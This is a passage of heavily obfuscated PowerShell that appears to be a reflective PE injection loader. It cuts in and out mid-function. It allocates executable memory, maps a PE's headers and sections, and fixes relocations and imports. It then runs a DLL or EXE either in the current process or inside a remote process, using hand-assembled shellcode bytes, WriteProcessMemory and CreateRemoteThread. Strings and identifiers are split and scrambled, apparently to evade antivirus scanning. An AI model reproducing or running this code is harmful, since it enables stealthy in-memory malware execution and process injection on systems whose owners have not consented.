        if ((${pe`infO}."DLlCHArAc`T`er`iSt`ICs" -band ${WIn32C`ONst`An`TS}."ima`GE_dlLchARac`Te`RiStI`Cs_N`x_coMPaT") -ne ${wIn`3`2`Co`NStAnts}."IMagE_`d`LLchARACTEriST`I`Cs_NX`_`coMpaT")
        {
            &("{1}{2}{0}" -f 'g','Writ','e-Warnin') ("{3}{0}{9}{1}{8}{6}{2}{7}{5}{4}{10}" -f 't c','pa',' DEP, ','PE is no',' is','ause','ith','might c','tible w','om','sues') -WarningAction ("{0}{1}"-f'C','ontinue')
            ${N`X`cOMpAt`IBLE} = ${F`Al`Se}
        }
        
        
        
        ${procES`S`64`BIT} = ${t`RUE}
        if (${ReMO`TElo`Ad`INg} -eq ${Tr`UE})
        {
            ${kEr`Ne`L32HANd`Le} = ${wIn32`FuN`cTi`O`Ns}."G`et`MOdule`hA`NdlE"."i`Nvoke"(("{3}{0}{2}{1}"-f 'ernel','dll','32.','k'))
            ${R`eSuLt} = ${WIn`32`F`UNCtI`onS}."gEtpr`OC`Ad`DREsS"."i`NvOKE"(${Ke`R`N`EL32`HanDLe}, ("{3}{2}{1}{0}" -f 'ss','oce','r','IsWow64P'))
            if (${Re`SU`LT} -eq  (VAriable pEfz6J  ).vAluE::"Z`erO")
            {
                Throw ((("{4}{5}{6}{7}{10}{15}{14}{11}{1}{0}{17}{12}{13}{2}{8}{3}{16}{18}{9}" -f'er','t','get','roces','Coul','dn','{','0}t l',' p',' or 64bit','o','e IsWow64Process function to de','ne if t','ar','t','ca','s is ','mi','32bit'))  -f  [CHaR]39)
            }
            
            [Bool]${wOw`6`4Pr`o`CESS} = ${f`Al`se}
            ${suc`cESs} = ${wIN3`2f`UncTioNS}."IsWow`64P`RoCESs"."i`NV`oKe"(${ReMOTepR`OcHA`N`DlE}, [Ref]${W`O`W`64pROce`Ss})
            if (${sUC`c`eSs} -eq ${F`A`lSE})
            {
                Throw ("{3}{5}{2}{4}{0}{1}"-f'i','led','sWow64Pro','Ca','cess fa','ll to I')
            }
            
            if ((${Wow`64p`RoCE`Ss} -eq ${t`RuE}) -or ((${W`OW`64p`RoC`Ess} -eq ${f`ALsE}) -and ( ( cHILDITem VarIAblE:zNDo ).VaLuE::"s`iZeOf"([Type][IntPtr]) -eq 4)))
            {
                ${Pr`Oc`Es`s64BIt} = ${fA`lSE}
            }
            
            
            ${Po`we`RSH`el`L64`BiT} = ${t`Rue}
            if ( (  VARIAblE  ZNdo ).valUe::"siz`e`OF"([Type][IntPtr]) -ne 8)
            {
                ${p`O`wERsh`e`ll64Bit} = ${Fa`L`sE}
            }
            if (${Pow`ERSh`eLl`64BiT} -ne ${prOcEs`S64B`it})
            {
                throw (("{13}{19}{7}{18}{9}{16}{14}{5}{8}{10}{6}{2}{3}{12}{0}{11}{1}{15}{17}{4}{20}" -f')','E being','x86','/','ed and remot',' ','e architecture (','r','be sa','ll','m',' as P','x64','P','ust',' loa',' m','d','She','owe','e process'))
            }
        }
        else
        {
            if ( $Zndo::"SIz`eoF"([Type][IntPtr]) -ne 8)
            {
                ${PROC`Es`s64BiT} = ${F`ALSE}
            }
        }
        if (${P`ROc`e`Ss6`4BIt} -ne ${p`EiNFo}."p`E6`4biT")
        {
            Throw ((("{7}{17}{18}{23}{13}{11}{6}{19}{8}{14}{25}{3}{2}{5}{15}{0}{1}{12}{16}{4}{10}{24}{21}{9}{20}{22}" -f 'it ','i',' th','of','ng l','e',' doesnDp2t mat','P',' th','6','oad','m','s be','for','e architec',' process ','i','E',' pl','ch','4b',' (32/','it)','at','ed in','ture ')) -rEpLACe ([cHaR]68+[cHaR]112+[cHaR]50),[cHaR]39)
        }
        

        
        &("{2}{0}{1}"-f'rite-V','erbose','W') ("{8}{5}{3}{1}{10}{0}{4}{9}{6}{7}{2}" -f'PE a','h','ory','ating memory for t','nd write i','c','e','rs to mem','Allo','ts head','e ')
        
        
        [IntPtr]${loADA`D`dr} =  ( geT-VariABlE PEFZ6j  ).VAlue::"ze`Ro"
        ${PeSu`pp`O`Rtsas`LR} = (${pEiN`Fo}."dL`L`CHArAc`TeRIsTIcs" -band ${W`i`N32coNs`TAN`Ts}."I`maG`E_`dLLC`H`ARacTeRiSTIcS`_DYn`AMi`C_b`A`Se") -eq ${wI`N32Co`NsTAN`Ts}."image_DLLcH`A`RaCTe`RI`sTI`c`S`_d`YnAMI`C_BaSE"
        if ((-not ${Fo`RcEA`sLR}) -and (-not ${p`esUppoR`TsaS`lR}))
        {
            &("{2}{4}{0}{1}{3}" -f'e-Wa','r','Wr','ning','it') (("{2}{32}{25}{27}{1}{16}{37}{6}{18}{10}{11}{40}{4}{13}{24}{21}{14}{23}{39}{7}{31}{38}{36}{5}{43}{12}{42}{34}{33}{29}{0}{8}{20}{35}{17}{22}{46}{45}{44}{15}{3}{19}{26}{9}{30}{41}{28}" -f 'n','ely l','PE fi','l','e','tryin',' no','r','g the ','se','b','l',' ',' lo',' try restarti','ou','oaded ','R','t ASLR compati','d c','-F','ils,',' f','ng Pow','ading fa','e being ref','au','lectiv','s)','i',' c','She','l','us','in OR try ','orceASL','l and ','is','l','e','e. If th','rashe','aga','g',' (c','ag','l')) -WarningAction ("{2}{1}{0}" -f'e','inu','Cont')
            [IntPtr]${lOAD`AD`DR} = ${oriGI`NalIm`Age`BA`se}
        }
        elseif (${ForC`eaS`lR} -and (-not ${PesuppOR`TsAs`Lr}))
        {
            &("{2}{3}{0}{1}"-f't','e-Verbose','W','ri') ((("{19}{9}{11}{17}{20}{5}{18}{13}{14}{6}{3}{8}{15}{1}{21}{4}{2}{0}{10}{7}{16}{22}{12}"-f ' could result ','the PE f','s',' ASL','Thi','F','. Forcing','n ','R ','doesnC8lt','i',' su','.',' ','is set','on ','a c','pport ASLR b','orceASLR','PE file ','ut -','ile. ','rash'))."Repl`Ace"('C8l',[STRinG][chAr]39))
        }

        if (${foRc`E`ASlR} -and ${rE`m`oTEloadi`NG})
        {
            &("{1}{3}{0}{2}"-f'-Err','Wri','or','te') ("{7}{9}{5}{2}{0}{6}{8}{4}{1}{3}"-f'ng i','pr','ForceASLR when loadi','ocess.',' ','use ','n to a remot','Can','e','not ') -ErrorAction ("{1}{0}" -f'top','S')
        }
        if (${rE`mo`Te`loadI`NG} -and (-not ${P`eS`UPpORts`AsLR}))
        {
            &("{3}{1}{0}{2}"-f'-','ite','Error','Wr') ((("{0}{6}{15}{13}{8}{9}{16}{12}{7}{14}{4}{1}{3}{2}{11}{5}{10}" -f 'PE doe','to a','e',' r','SLR PE in ','p','sns','-','o','ad ','rocess','mote ',' non','nnot l','A','aft support ASLR. Ca','a'))."r`epl`ACE"('saf',[StRinG][cHaR]39)) -ErrorAction ("{1}{0}" -f 'p','Sto')
        }

        ${P`E`HandLe} =  (  VariaBlE  PeFZ6j  -va )::"Z`eRo"              
        ${EFfeC`T`iV`EpE`HAnD`Le} =  (VarIAblE ('P'+'efz'+'6J')  ).vALuE::"Z`ErO"     
        if (${re`motEloADI`Ng} -eq ${T`RUE})
        {
            
            ${PE`h`ANDLe} = ${wI`N32f`Un`ctIonS}."v`ir`TUal`AlLoC"."inV`oKE"( ( VARIable  PEFz6j -vALue )::"ZE`RO", [UIntPtr]${PEi`NfO}."SI`z`eofi`MaGe", ${wiN32CoNsTA`N`TS}."m`E`M_ComM`iT" -bor ${Win32`cO`NS`TA`NtS}."meM_`RE`SE`Rve", ${W`i`N32CoNSTA`N`TS}."p`A`ge_ReaDWR`i`Te")
            
            
            ${EFFEcT`I`VEpe`Hand`lE} = ${Win`3`2FUnc`TionS}."VIRTU`Al`ALl`OceX"."inVo`ke"(${rEmotEP`RO`C`HaNdLe}, ${L`Oad`A`dDR}, [UIntPtr]${Pei`N`Fo}."SIz`EOF`IM`AGE", ${Wi`N`32CoNS`Ta`Nts}."mEm_c`OMM`It" -bor ${Win32C`oNst`A`N`TS}."Me`m_r`e`sERvE", ${w`iN32C`onsT`ANts}."PAgE_`exEcU`TE_ReAdWr`I`Te")
            if (${effeC`T`IvEPEhAn`dLe} -eq  $pEfz6J::"ze`RO")
            {
                Throw ((("{38}{17}{11}{30}{8}{21}{22}{10}{6}{27}{26}{37}{28}{9}{19}{29}{25}{2}{4}{33}{14}{15}{36}{12}{0}{23}{3}{34}{13}{35}{40}{32}{1}{31}{7}{20}{18}{39}{5}{16}{41}{24}{42}" -f ' ','cou','he PE b','port','eing l','ess of t','he re','the re','cate m',' I','t','o','}t','A','o','esn{','he PE is','le t',' base a','f','quested','emory i','n ','sup','ready in','t','e proc','mot','.',' ',' allo','ld be that ',' ','oaded d',' ','S','0','ess','Unab','ddr','LR, it',' al',' use'))  -f[chAR]39)
            }
        }
        else
        {
            if (${nXcOm`PATI`Ble} -eq ${Tr`UE})
            {
                ${PeHA`N`DLE} = ${Wi`N32fUncT`IO`NS}."V`iRtual`ALLoC"."IN`VO`ke"(${Loa`DaD`dr}, [UIntPtr]${pei`N`FO}."Si`Ze`OFimagE", ${wIn32Co`N`STa`NtS}."mEM_`CO`Mmit" -bor ${Win32co`N`sT`A`NTs}."Mem`_Re`sErve", ${Win32`cON`sT`ANTs}."paGE`_rEad`W`RI`Te")
            }
            else
            {
                ${pE`H`AndlE} = ${wiN`32fuN`cTi`O`NS}."VIRt`U`AlalLoC"."iN`VOke"(${l`o`A`dAdDR}, [UIntPtr]${p`EI`NFO}."Sizeofi`M`A`gE", ${w`iN32Con`S`TaNtS}."MEm_c`om`mIt" -bor ${WIn3`2C`oN`s`TAntS}."ME`M_r`e`seRve", ${wIN32c`onsT`A`Nts}."P`Age_exeCuTE_`ReAd`W`RIte")
            }
            ${E`F`FeCtI`VEPehaNdlE} = ${p`E`HAnD`LE}
        }
        
        [IntPtr]${PE`EN`DA`dDreSs} = &("{3}{1}{5}{2}{0}{7}{6}{4}"-f 'si','-SignedInt','sUn','Add','ed','A','n','g') (${PEHAN`D`LE}) ([Int64]${p`EI`Nfo}."S`iZeofim`AGE")
        if (${Pe`hAn`Dle} -eq   (LS VaRiaBLe:pEfz6J).VALue::"Ze`Ro")
        { 
            Throw (("{10}{25}{18}{12}{36}{54}{51}{33}{61}{59}{39}{23}{57}{43}{5}{40}{31}{8}{46}{32}{3}{19}{34}{52}{27}{55}{37}{50}{44}{48}{60}{26}{21}{41}{16}{29}{49}{47}{13}{2}{6}{20}{14}{53}{62}{58}{35}{63}{7}{4}{38}{42}{9}{30}{1}{64}{17}{45}{15}{22}{24}{28}{11}{56}{0}" -f 'ee).','ut, ','the new Power',' not A',' dif','r P','S',' have a',' P',' ','V','f','oc fa',' (','ce','the P','pr','a','ualAll','SLR comp','hell pro','e','E wa','memo','nts mig','irt','Sh','y','ht be ','o','memory layo','If','is','l','atible','i','iled ','ning th','fere','e ','E. ','ll ','nt',' fo','c','ddress ','E ','s','ript i','ces','e s',' al',', tr','ss','to',' run','r','ry','w','at','n a new Power','oc',' ','ll','so the '))
        }       
         (gcI  ('vAr'+'Ia'+'BLe'+':zNDO')  ).ValuE::("{1}{0}"-f'py','Co').Invoke(${PE`B`yTES}, 0, ${peha`N`dle}, ${p`EI`Nfo}."sIZeOf`HEade`RS") | &("{2}{1}{0}"-f '-Null','t','Ou')
        
        
        
        &("{1}{0}{2}" -f'rite-Verbos','W','e') ("{17}{14}{4}{6}{13}{8}{10}{18}{7}{0}{15}{9}{2}{5}{3}{16}{1}{12}{11}"-f'at','d','he heade','loa','de','rs ','ta','rm',' PE i',' from t','n','y',' in memor','iled','g ','ion','de','Gettin','fo')
        ${pe`I`NfO} = &("{4}{2}{0}{3}{5}{1}" -f 'Detailed','o','t-PE','In','Ge','f') -PEHandle ${Pe`Ha`NDle} -Win32Types ${wIN3`2tyP`ES} -Win32Constants ${W`iN32CONstAn`TS}
        ${pE`INfo} | &("{2}{0}{1}" -f 'mb','er','Add-Me') -MemberType ("{1}{2}{0}" -f'ty','N','oteProper') -Name ("{0}{2}{1}{3}" -f 'EndAddr','s','e','s') -Value ${p`EEn`D`AddrE`SS}
        ${Pe`InfO} | &("{2}{1}{0}" -f'ber','Mem','Add-') -MemberType ("{2}{3}{0}{1}"-f't','y','Note','Proper') -Name ("{1}{2}{0}{3}" -f'dl','Ef','fectivePEHan','e') -Value ${effECTI`V`ePEhaN`dLe}
        &("{0}{3}{2}{1}"-f 'W','ose','rb','rite-Ve') "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress) "
        
        
        
        &("{0}{3}{1}{2}"-f'Wr','te-Ve','rbose','i') ("{2}{0}{4}{7}{1}{3}{6}{5}"-f 'y PE se',' in','Cop',' to memo','cti','y','r','ons')
        &("{0}{2}{1}{3}" -f'C','S','opy-','ections') -PEBytes ${P`eB`ytes} -PEInfo ${pei`Nfo} -Win32Functions ${W`I`N32F`U`NctIONs} -Win32Types ${win32Ty`p`es}
        
        
        
        &("{0}{1}{3}{2}"-f'Write-','Ver','se','bo') ("{0}{9}{12}{6}{11}{13}{4}{8}{2}{5}{7}{14}{15}{3}{1}{10}"-f 'Up',' loaded in mem','sed on','ctually','esses ',' ','te','where the P','ba','d','ory',' mem','a','ory addr','E was',' a')
        &("{4}{6}{1}{5}{0}{2}{3}"-f'd','e-Memo','re','sses','U','ryAd','pdat') -PEInfo ${pe`iNFo} -OriginalImageBase ${or`iG`INal`IM`Ag`ebAsE} -Win32Constants ${WIn`32`C`OnSTAn`Ts} -Win32Types ${WI`N3`2TyP`Es}

        
        
        &("{0}{2}{1}"-f'Write-Ve','ose','rb') ((("{9}{13}{11}{6}{0}{8}{2}{4}{3}{7}{5}{1}{10}{12}"-f 'eeded b','are',' the','E',' P',' ','s n',' we','y','Import',' lo','L4xo','ading',' DL'))."r`E`pLacE"(([chAr]52+[chAr]120+[chAr]111),[STRiNG][chAr]39))
        if (${reMOte`load`Ing} -eq ${Tr`Ue})
        {
            &("{0}{1}{4}{2}{3}" -f'Im','port-DllI','p','orts','m') -PEInfo ${pEIn`Fo} -Win32Functions ${WIn32`FU`NCT`IoNS} -Win32Types ${wI`N3`2t`ypeS} -Win32Constants ${wIN`32Co`NS`TaNtS} -RemoteProcHandle ${ReMo`TEP`ROcHanD`lE}
        }
        else
        {
            &("{1}{0}{3}{2}" -f 'rt','Impo','mports','-DllI') -PEInfo ${P`eiNFO} -Win32Functions ${w`iN32F`UnCti`ONs} -Win32Types ${wi`N32`T`yPES} -Win32Constants ${wIn3`2coN`StAN`TS}
        }
        
        
        
        if (${Re`moT`ELoADi`NG} -eq ${fA`L`Se})
        {
            if (${N`xC`Om`PAtibLE} -eq ${TR`Ue})
            {
                &("{2}{4}{1}{3}{0}" -f'e','er','Wr','bos','ite-V') ("{0}{8}{1}{6}{7}{2}{4}{5}{3}" -f'Upd','memo','ion ','gs','f','la','ry prot','ect','ate ')
                &("{2}{5}{1}{0}{3}{4}" -f'ionFl','-MemoryProtect','Up','a','gs','date') -PEInfo ${PE`INfo} -Win32Functions ${WIN32f`UN`ct`Io`NS} -Win32Constants ${Wi`N3`2Co`NstAN`Ts} -Win32Types ${wIn3`2TYP`es}
            }
            else
            {
                &("{1}{0}{2}"-f'-Verbo','Write','se') ("{7}{2}{18}{13}{25}{24}{19}{21}{23}{5}{8}{22}{1}{3}{6}{10}{20}{12}{17}{0}{11}{26}{15}{14}{16}{9}{4}" -f'as read ','h NX memo','E b','ry, kee','e','not c','pin','P','omp','t','g ','wr','emory','g reflective',' ','e','execu',' ','ein','load','m','ed','atible wit',' is ','y ','l','it')
            }
        }
        else
        {
            &("{1}{0}{2}"-f 'e-Ver','Writ','bose') ("{10}{14}{3}{9}{11}{5}{4}{12}{1}{0}{2}{7}{13}{8}{6}" -f 's',' adju','ting memory p','ded in to a ','te','mo','s','ermis','n','r','PE','e',' process, not','sio',' being loa')
        }
        
        
        
        if (${reMOTE`lo`A`DI`Ng} -eq ${tR`UE})
        {
            [UInt32]${nu`mbyTeSW`RI`T`TEn} = 0
            ${sU`ccESs} = ${wi`N3`2fuNCTI`ONs}."WR`it`EPro`ceSSme`Mo`RY"."IN`VOKE"(${re`moTEp`ROCHA`ND`Le}, ${EffeCT`I`VEpehaN`Dle}, ${Peha`ND`Le}, [UIntPtr](${P`Ei`Nfo}."Si`ZeoFiM`AGE"), [Ref]${N`UMbY`TEswr`IttEN})
            if (${s`UCCe`Ss} -eq ${fa`l`se})
            {
                Throw ("{5}{11}{8}{3}{12}{9}{7}{4}{1}{13}{0}{10}{2}{6}"-f'ce','mote',' m',' to write ','o re','U','emory.','e t','able','llcod','ss','n','she',' pro')
            }
        }
        
        
        
        if (${p`ei`Nfo}."f`il`ETYPe" -ieq "DLL")
        {
            if (${re`motE`LOad`I`NG} -eq ${fA`lse})
            {
                &("{4}{0}{3}{2}{1}"-f'rit','e','Verbos','e-','W') ("{5}{1}{10}{3}{2}{12}{4}{13}{9}{14}{11}{6}{0}{8}{7}"-f 'o','dl','n','ai','he D','Calling ','n l','d','ade',' ha','lm','e',' so t','LL knows it','s be')
                ${dl`LM`A`InPtR} = &("{3}{5}{0}{4}{2}{6}{1}"-f 'd','ned','dIntA','A','-Signe','d','sUnsig') (${peI`Nfo}."pehA`NDle") (${P`EIN`FO}."im`Age`_Nt`_`heADeRs"."Op`T`IoNalHE`AD`eR"."ad`d`ReSSOfENTR`y`P`O`InT")
                ${dL`LmAInd`E`L`EgAtE} = &("{4}{3}{1}{0}{2}" -f 't','ga','eType','ele','Get-D') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                ${D`LLm`Ain} =  (GET-VARIAbLE  zNDO  -ValU )::("{1}{0}{5}{4}{2}{3}"-f'eForF','GetDelegat','Point','er','n','unctio').Invoke(${D`LlmAinP`Tr}, ${dL`L`mAiNDE`leGa`TE})
                
                ${D`lL`maIn}."i`NVOKe"(${PEi`NfO}."P`ehANd`le", 1,   (ItEm  VARiABLE:PEfZ6J  ).vAlUe::"zE`RO") | &("{0}{1}" -f'Ou','t-Null')
            }
            else
            {
                ${D`Llma`Inp`TR} = &("{1}{0}{4}{3}{2}" -f'dd-Signed','A','signed','Un','IntAs') (${e`FFeCTiVEP`E`hand`le}) (${p`EIn`Fo}."Im`AGE`_`NT_hEaD`erS"."o`PtIOnALH`eaD`eR"."AdDrESS`oFeNTr`YpO`inT")
            
                if (${PEi`NFo}."P`E64BIT" -eq ${tR`UE})
                {
                    
                    ${cA`Lldll`Ma`INSC1} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    ${ca`llDL`LmAINS`c2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    ${CaLL`dlL`mAi`Ns`C3} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    
                    ${C`Al`L`D`LlmAInSc1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    ${CALLdl`l`MaiNs`C2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    ${CAlL`dL`lMainSC3} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                ${S`cLEN`G`Th} = ${C`AllD`lL`m`AinSC1}."l`eNgTH" + ${cALl`DllMAI`N`sC2}."lE`NgtH" + ${Ca`LL`d`LlM`Ainsc3}."L`EngTh" + (${ptr`s`iZE} * 2)
                ${S`cp`SmEM} =   (  get-vAriAblE  zNDO  ).VALue::("{2}{0}{1}"-f'oba','l','AllocHGl').Invoke(${S`cl`eNgTh})
                ${SCP`s`me`MORIG`inaL} = ${s`cP`SmeM}
                
                &("{0}{5}{2}{4}{3}{1}" -f 'Wri','ry','e-BytesTo','o','Mem','t') -Bytes ${callD`LL`Ma`INs`c1} -MemoryAddress ${SC`ps`MeM}
                ${ScP`S`MeM} = &("{7}{0}{4}{6}{3}{2}{5}{1}"-f'dd','signed','tAsU','nedIn','-','n','Sig','A') ${sCps`M`em} (${CA`L`LdllMAinS`c1}."l`En`GtH")
                 (  GET-ChIldItEm vARIaBLe:ZNdo).VAluE::("{1}{2}{0}{3}{4}" -f'reT','S','tructu','oPt','r').Invoke(${eFFectI`V`EP`ehandLe}, ${S`c`PSMEM}, ${fa`L`Se})
                ${SC`PsmEm} = &("{1}{2}{4}{3}{6}{5}{0}" -f'ned','Ad','d-Si','sUns','gnedIntA','g','i') ${ScP`SM`Em} (${pT`R`sIze})
                &("{5}{2}{4}{3}{0}{1}" -f'esToM','emory','t','Byt','e-','Wri') -Bytes ${CALl`dlLm`AIN`Sc2} -MemoryAddress ${sC`PSMEM}
                ${S`cpSMEM} = &("{2}{5}{1}{3}{0}{4}" -f'AsUnsign','d-Sign','A','edInt','ed','d') ${s`cPS`Mem} (${CAlLd`lLmA`In`SC2}."LeNG`TH")
                 (  GeT-VARIAblE znDo  -VAlUe  )::("{2}{1}{3}{0}"-f 'tr','truc','S','tureToP').Invoke(${D`L`l`MAInptr}, ${sC`PsM`eM}, ${fA`LsE})
                ${Sc`PsM`eM} = &("{0}{3}{2}{4}{1}"-f'Add-Si','sUnsigned','edI','gn','ntA') ${scps`m`Em} (${Ptrs`IZE})
                &("{5}{2}{0}{1}{4}{3}"-f'te-Bytes','T','ri','Memory','o','W') -Bytes ${CA`LlDlLma`iNs`c3} -MemoryAddress ${SC`p`sMeM}
                ${sCp`SMEM} = &("{1}{4}{0}{3}{2}"-f'n','Add-SignedInt','ned','sig','AsU') ${S`CpS`mem} (${CA`L`lDLl`MAins`C3}."l`engtH")
                
                ${R`S`cAdDr} = ${WIn32F`UN`cT`IOnS}."virtUALAl`Loc`Ex"."i`N`VoKe"(${r`EMo`T`ePro`chA`NDLe},   ( Get-vAriABlE PEFZ6J ).ValUe::"Z`erO", [UIntPtr][UInt64]${SC`L`En`GTh}, ${WIn3`2`cOnst`ANTs}."M`e`M`_comMIT" -bor ${wIN32Con`s`TAn`TS}."Mem`_res`eRVE", ${w`in32`CoNSta`NTS}."PaGE_`e`XEcUT`e_`REadw`RIte")
                if (${r`S`CAdDr} -eq  (LS  ("V"+"aRiAbl"+"E:PEfz6j")).VALUE::"zE`RO")
                {
                    Throw ("{0}{8}{2}{9}{4}{6}{7}{3}{5}{1}" -f 'Unable ','de','lloc','te process f','emory ','or shellco','in the re','mo','to a','ate m')
                }
                
                ${s`U`CCess} = ${wiN3`2F`UNc`Ti`oNS}."WRitEPrO`Ce`sSM`e`m`oRy"."InVo`kE"(${R`EM`OteproC`haNDle}, ${Rsc`Ad`DR}, ${SCps`mEmO`R`Igi`NaL}, [UIntPtr][UInt64]${ScLEn`g`Th}, [Ref]${N`UMBytEs`wrIT`T`En})
                if ((${sUCCe`sS} -eq ${FA`Lse}) -or ([UInt64]${NUmbY`TesWrI`TT`En} -ne [UInt64]${sC`LENg`TH}))
                {
                    Throw ("{9}{1}{2}{3}{4}{7}{10}{11}{0}{12}{8}{5}{6}" -f 'm','able to',' writ','e sh','e','s memory','.','llcode t','proces','Un','o ','re','ote ')
                }

                ${R`T`hr`EADhandLE} = &("{0}{1}{2}{3}" -f 'Create-R','em','ote','Thread') -ProcessHandle ${rEMotEPRo`Cha`N`DlE} -StartAddress ${r`SCa`DDR} -Win32Functions ${WIN32f`U`N`CT`ions}
                ${ReSu`lT} = ${wIN`32fUNc`Ti`o`NS}."wa`ItFo`RSi`NGlEOBj`ECt"."iN`Vo`Ke"(${rThR`eadH`ANdLe}, 20000)
                if (${R`eSU`Lt} -ne 0)
                {
                    Throw ("{12}{10}{13}{5}{9}{3}{14}{7}{1}{4}{2}{15}{0}{11}{6}{8}"-f' Ge','e',' to','e','ad','a','Pro','r','cAddress failed.','teR','l to','t','Cal',' Cre','moteTh',' call')
                }
                
                ${WI`N32fU`NCT`ioNS}."virTualFR`EE`ex"."I`NV`OKE"(${Re`MotEPROCh`A`N`dle}, ${rscA`D`dR}, [UIntPtr][UInt64]0, ${w`in32COn`staNTS}."mEM_`Rel`eASE") | &("{1}{0}" -f 'ull','Out-N')
            }
        }
        elseif (${p`E`iNfo}."F`IL`eType" -ieq "EXE")
        {
            
            [IntPtr]${exeDOnEByT`E`pTR} =   (vaRIAblE ("ZN"+"Do") -vaLU )::("{0}{3}{2}{1}" -f'Al','l','ocHGloba','l').Invoke(1)
             $znDO::("{0}{1}{2}" -f 'Write','B','yte').Invoke(${e`XEdo`N`EBYTEPTr}, 0, 0x00)
            ${o`VE`RWRiTTe`NMEMI`Nfo} = &("{2}{3}{0}{4}{5}{1}" -f 'x','ns','Update-','E','eFu','nctio') -PEInfo ${P`einFO} -Win32Functions ${wIN32fuN`CT`ionS} -Win32Constants ${wIn32Con`ST`ANTs} -ExeArguments ${eX`eaRGS} -ExeDoneBytePtr ${E`XEdoneBy`TE`PTR}

            
            
            [IntPtr]${EXeM`A`iN`PTR} = &("{1}{0}{2}{5}{4}{3}" -f'-Sig','Add','ne','igned','s','dIntAsUn') (${p`EiNfo}."pe`handLE") (${PE`INFo}."iMaGe`_`N`T_HE`AdeRs"."oPt`I`O`NAlH`eadER"."adDR`EsSOfent`R`Yp`oINt")
            &("{0}{1}{2}{3}" -f 'Wr','i','te-Verb','ose') "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in. "

            ${Win`32`F`UNcTioNS}."cRe`At`eTHrEad"."i`NV`oKE"( ( DiR varIAbLE:PeFz6J ).Value::"ze`Ro",  $pefz6J::"zE`Ro", ${EXeM`AIN`ptr},  (  CHIldiTEm  vAriAbLE:pEFZ6j).valUe::"z`ErO", ([UInt32]0), [Ref]([UInt32]0)) | &("{0}{2}{1}" -f 'Out','l','-Nul')

            while(${TR`UE})
            {
                [Byte]${ThrEad`D`o`NE} =  (gET-VariabLe Zndo  -VAl  )::("{1}{0}{2}" -f'dByt','Rea','e').Invoke(${Ex`e`dONe`BytepTR}, 0)
                if (${ThR`eaD`DONE} -eq 1)
                {
                    &("{1}{4}{6}{3}{0}{2}{5}"-f 'MemAddres','Co','s','ArrayOf','p','es','y-') -CopyInfo ${Ove`R`wRItTENme`MinfO} -Win32Functions ${WIn32`F`UN`cTIoNs} -Win32Constants ${Win3`2`cO`NSTants}
                    &("{1}{0}{3}{2}"-f'i','Wr','rbose','te-Ve') ("{2}{1}{3}{6}{5}{4}{0}" -f'leted.','E thread ','EX','has','omp','c',' ')
                    break
                }
                else
                {
                    &("{2}{0}{1}"-f 'art-','Sleep','St') -Seconds 1
                }
            }
        }
        
        return @(${p`eInFO}."P`Eh`ANDle", ${EFfE`ct`ivePeh`An`DLE})
    }
    
    
    Function invoke-me`moR`YFR`eE`L`iBRARy
    {
        Param(
        [Parameter(posiTIoN=0, maNDaTORy=${T`Rue})]
        [IntPtr]
        ${p`eHa`NDle}
        )
        
        
        ${w`In`32`cOnSt`ANTS} = &("{3}{2}{5}{0}{4}{1}" -f'in32Consta','ts','e','G','n','t-W')
        ${wIN32`F`UnCTiOns} = &("{0}{3}{2}{1}" -f'Get-Wi','s','nction','n32Fu')
        ${WiN`32tY`P`eS} = &("{0}{1}{2}" -f'Get','-Win32Ty','pes')
        
        ${p`Einfo} = &("{4}{2}{5}{0}{1}{3}"-f'I','nf','EDetai','o','Get-P','led') -PEHandle ${PEH`AN`dlE} -Win32Types ${W`iN32t`Yp`ES} -Win32Constants ${W`iN3`2`C`OnSTanTS}
        
        
        if (${P`EI`Nfo}."imagE_`N`T_h`EADErs"."O`p`TionaL`hEAder"."i`M`portTAbLe"."S`izE" -gt 0)
        {
            [IntPtr]${IMpor`TD`EScRIP`TOrpTR} = &("{4}{2}{3}{0}{1}" -f'U','nsigned','dInt','As','Add-Signe') ([Int64]${p`Ein`Fo}."PEH`ANdlE") ([Int64]${pe`inFO}."imaGE`_`NT_hEaDe`Rs"."opTION`AlhE`A`d`eR"."i`mpO`RT`TaBLe"."virtua`LaDd`R`ESs")
            
            while (${t`RuE})
            {
                ${ImportDesc`R`ipT`Or} =  ( LS varIaBLE:ZNdo  ).vALuE::"PTRT`oSt`RUCtu`RE"(${iMP`OrT`DE`s`cr`ipTOrPtr}, [Type]${wIn32`TYp`es}."Im`AGE`_ImP`o`RT_DeScRi`P`Tor")
                
                
                if (${I`m`pOr`TdEscrIpTor}."Cha`R`ACtErIStiCs" -eq 0 `
                        -and ${iM`POR`TDescr`ipT`oR}."F`irstt`HuNK" -eq 0 `
                        -and ${IMpoRTdEScR`I`p`ToR}."f`oRwaRD`erCh`AIn" -eq 0 `
                        -and ${iMpo`R`TDesc`Ri`PTor}."NA`mE" -eq 0 `
                        -and ${i`mPoRtdESc`RI`pTOr}."tIm`edAT`es`TaMP" -eq 0)
                {
                    &("{2}{0}{1}"-f'-Ver','bose','Write') ("{1}{9}{7}{2}{5}{6}{10}{3}{8}{4}{0}" -f 'eeded by the PE','Done','e','es','n',' ','libr','ing th',' ',' unload','ari')
                    break
                }

                ${IMp`oR`TdL`LPatH} =  (cHilDITEm  variaBle:ZnDo  ).vALUe::"ptRtO`stR`i`Ngansi"((&("{6}{1}{3}{2}{0}{4}{5}"-f 'IntAsUnsig','d','ned','d-Sig','ne','d','A') ([Int64]${pe`i`NfO}."P`E`HaNdlE") ([Int64]${imPo`RTDEscr`i`pTOr}."Na`me")))
                ${iMp`oRt`DLL`han`d`lE} = ${WIN`3`2`Fu`NCTIoNS}."ge`TmODULE`HAn`DLe"."inv`o`ke"(${imPorTdl`L`pAtH})

                if (${iMPort`d`lL`Ha`NdlE} -eq ${N`ULl})
                {
